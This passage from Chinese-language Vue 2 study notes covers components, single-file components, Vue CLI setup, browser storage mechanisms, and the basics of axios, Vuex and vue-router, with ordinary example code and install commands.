        components:{app}
    })
</script>
```



### 2.2.5 VueComponent

school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

我们只需要写`<school/>`或`<school><school/>`，解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。

特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！(这个VueComponent可不是实例对象)

关于this指向：

**组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。**

**new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。**

VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。

Vue的实例对象，以后简称vm。



Vue 在哪管理 VueComponent?

![image-20220420212743331](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420212743331.png)



### 2.2.6 一个重要的内置关系

- 一个重要的内置关系：VueComponent.prototype.**proto** === Vue.prototype
- 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。



![image-20220420213310666](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420213310666.png)



## 2.3 单文件组件

单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。

单文件组件写法介绍

![image-20220420220951986](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420220951986.png)



### 2.3.1 定义组件

**School.vue**

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>

```



**Student.vue**

```vue
<template>
<!-- template里写组件的结构
    template不参与编译，最后结构就只剩<div></div>里面的东西
 -->
    <div class="demo">
        <h2>学生名称：{{name}}</h2>
        <h2>学生地址：{{address}}</h2>
        <button @click="showName">点我提示学生地址</button>
    </div>
</template>

<script>




/**
 * script写交互相关的代码（数据方法等）
 * 只有暴露组件，才能引入
 * 关键字export能让组件暴露，可以被重用
 * export default是默认暴露
 *  */ 
export default {
    //name为组件名
    name:'student',
    //以下为配置项
    data() {
        return {
            name:'库里',
            address:'JinZhou'
        }
    },
    methods: {
        showName(){
            alert(this.name)
        }
    },
}
</script>






<style>
/* style写组件的样式 */
    .demo{
        background-color: orange;
    }
</style>
```



### 2.3.2 注册组件

> 把组件写到App汇总组件里

**App.vue**

用来汇总所有的组件(大总管)

```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>

```

### 2.3.3 写组件标签

> 在入口文件main.js，通过template写组件标签

**main.js**

在这个文件里面创建 vue 实例

```html
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})

```



==最后通过index.html页面来显示==

> 引入vue.js文件和main.js文件即可

**index.html**

在这写 vue 要绑定的容器

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
        <script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>

```



==打开index.html看下==

> es6不支持模块化语法，所以不显示。
>
> 我们下面用脚手架即可

![image-20220420221659162](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420221659162.png)





# 三、使用Vue脚手架

> 安装node.js会自动安装npm命令



## 3.1 安装

配置 npm 淘宝镜像：npm config set registry https://registry.npm.taobao.org



使用前置：

第一步(没有安装过的执行)：全局安装 @vue/cli

npm install -g @vue/cli

第二步：切换到要创建项目的目录，然后使用命令创建项目

vue create xxxxx

第三步：启动项目

npm run serve

![image-20220420222502357](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420222502357.png)







![image-20220420223439018](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420223439018.png)





脚手架创建成功

![image-20220420223710772](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420223710772.png)





## 3.2 访问测试

![image-20220420224008950](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220420224008950.png)







## 3.3 脚手架文件结构

```shell
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

## Vue项目的运行流程

在工程化的项目中，vue 要做的事情很单纯：**通过 main.js 把 App.vue 渲染到 index.html 的指定区域中。**

>  **render: h => h(App)	它的作用就是将App汇总组件放入容器中**

```vue
new Vue({

 // 将App组件放入容器中

 render: h => h(App)

})
```

![image-20220422144804071](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220422144804071.png)







**更换我们前面写的组件看看能不能生效**



![image-20220421100246642](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220421100246642.png)





## 3.4 render函数

使用 import 导入第三方库的时候不需要 加 ‘./’

导入我们自己写的：

```
import App from './App.vue'
```



导入第三方的

```
import Vue from 'vue'
```

不需要在 from ‘vue’ 加 './' 的原因是第三方库 node_modules 人家帮我们配置好了。

我们通过 import 导入第三方库，在第三方库的 package.json 文件中确定了我们引入的是哪个文件



vue.js与vue.runtime.xxx.js的区别：

vue.js是完整版的Vue，包含：核心功能+模板解析器。

vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。



因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接

收到的createElement函数去指定具体内容。





## 3.5 组件化编程流程

1. 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。
2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：
3. 一个组件在用：放在组件自身即可。
4. 一些组件在用：放在他们共同的父组件上（状态提升）。
5. 实现交互：从绑定事件开始。



- 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！
- props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。



## 3.6 浏览器本地存储

### Cookie

Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie 是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用 于控制 Cookie 有效期、安全性、使用范围的可选属性组成。不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie 一同发送到服务器。



**Cookie的特性：**

Cookie一旦创建成功，名称就无法修改
Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie
每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb
有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的
Cookie在请求一个新的页面的时候都会被发送过去



**Cookie 在身份认证中的作用**

客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动 将 Cookie 保存在浏览器中。

随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie保存，通过请求头的形式发送给 服务器，服务器即可验明客户端的身份。

![在这里插入图片描述](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/e29b7e0bef784bc5b6b8ed50b0d8a509.png)



**Cookie 不具有安全性**

由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全 性。因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。

注意：千万不要使用 Cookie 存储重要且隐私的数据！比如用户的身份信息、密码等。



### Session

Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端再次访问时只需要从该Session中查找该客户的状态就可以了。session是一种特殊的cookie。cookie是保存在客户端的，而session是保存在服务端。



**为什么要用session**
由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了



**session原理**

当客户端第一次请求服务器的时候，服务器生成一份session保存在服务端，并将该数据(session)的id以cookie的形式传递给客户端；以后的每次请求，浏览器都会自动的携带cookie来访问服务器(session数据id)。



==图示：==

![image-20220421101020927](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220421101020927.png)



**session 标准工作流程**

![image-20220421101052224](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220421101052224.png)





### LocalStorage

LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。

**LocalStorage的优点：**

- 在大小方面，LocalStorage的大小一般为5MB，可以储存更多的信息
- LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在
- 仅储存在本地，不像Cookie那样每次HTTP请求都会被携带



**LocalStorage的缺点：**

- 存在浏览器兼容问题，IE8以下版本的浏览器不支持
- 如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage
- LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问



**LocalStorage的常用API：**

```js
// 保存数据到 localStorage
localStorage.setItem('key', 'value');

// 从 localStorage 获取数据
let data = localStorage.getItem('key');

// 从 localStorage 删除保存的数据
localStorage.removeItem('key');

// 从 localStorage 删除所有保存的数据
localStorage.clear();

// 获取某个索引的Key
localStorage.key(index)

```

LocalStorage的使用场景:

有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可

在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中




### SessionStorage

SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage 主要用于临时保存同一窗口(或标签页)的数据，刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据。



**SessionStorage与LocalStorage对比：**

- SessionStorage和LocalStorage都在本地进行数据存储；
- SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，
- SessionStorage只有在同一浏览器的同一窗口下才能够共享；
- LocalStorage和SessionStorage都不能被爬虫爬取；
  



**SessionStorage的常用API：**

```js
// 保存数据到 sessionStorage
sessionStorage.setItem('key', 'value');

// 从 sessionStorage 获取数据
let data = sessionStorage.getItem('key');

// 从 sessionStorage 删除保存的数据
sessionStorage.removeItem('key');

// 从 sessionStorage 删除所有保存的数据
sessionStorage.clear();

// 获取某个索引的Key
sessionStorage.key(index)
```



**SessionStorage的使用场景**

由于SessionStorage具有时效性，所以可以用来存储一些网站的游客登录的信息，还有临时的浏览记录的信息。当关闭网站之后，这些信息也就随之消除了。













































# 四、Vue中的ajax

**通用的 Ajax 请求库, 官方推荐，使用广泛**



## 4.1 axios简介

就是在vue发送ajax请求

![image-20220411113114605](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220411113114605.png)



vscode中使用node.js

如果遇见问题可以重启vscode即可

![image-20220411133538293](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220411133538293.png)







# 五、Vuex

## 5.1 概念

 在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。



## 5.2 何时使用？

 多个组件需要共享数据时







# 六、Vue-router

## 6.1 简介

理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。

前端路由：key是路径，value是组件。

![image-20220421113243866](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220421113243866.png)





![image-20220421113546776](https://typora-1259403628.cos.ap-nanjing.myqcloud.com/image-20220421113546776.png)



- 路由就是一组key-value对应关系
- 多个路由，需要经过路由器的管理





## 6.2 基本使用

1. 安装vue-router，命令：`npm i vue-router`
2. 应用插件：`Vue.use(VueRouter)`
3. 编写router配置项:

```vue
//引入VueRouter
import VueRouter from 'vue-router'
//引入Luyou 组件
import About from '../components/About'
import Home from '../components/Home'

//创建router实例对象，去管理一组一组的路由规则
const router = new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home
		}
	]
})

//暴露router
export default router
```

4.实现切换（active-class可配置高亮样式）

```vue
<router-link active-class="active" to="/about">About</router-link>
```

5.指定展示位置

```vue
<router-view></router-view>
```



## 6.3 几个注意点

1. 路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的$route属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的$router属性获取到。
  

## 6.4 多级路由（多级路由）

1. 配置路由规则，使用children配置项：

```vue
routes:[
	{
		path:'/about',
		component:About,
	},
	{
		path:'/home',
		component:Home,
		children:[ //通过children配置子级路由
			{
				path:'news', //此处一定不要写：/news
				component:News
			},
			{
				path:'message',//此处一定不要写：/message
				component:Message
			}
		]
	}
]
```



2.跳转（要写完整路径）：

```
<router-link to="/home/news">News</router-link>
```



3.指定展示位置

```
<router-view></router-view>
```



## 6.5 命名路由

1. 作用：可以简化路由的跳转。
2. 如何使用
   1. 给路由命名：

```js
{
	path:'/demo',
	component:Demo,
	children:[
		{
			path:'test',
			component:Test,
			children:[
				{
                      name:'hello' //给路由命名
					path:'welcome',
					component:Hello,
				}
			]
		}
	]
}

```

2. 简化跳转：

```vue
<!--简化前，需要写完整的路径 -->
<router-link to="/demo/test/welcome">跳转</router-link>

<!--简化后，直接通过名字跳转 -->
<router-link :to="{name:'hello'}">跳转</router-link>

<!--简化写法配合传递参数 -->
<router-link 
	:to="{
		name:'hello',
		query:{
		   id:666,
            title:'你好'
		}
	}"
>跳转</router-link>
```



























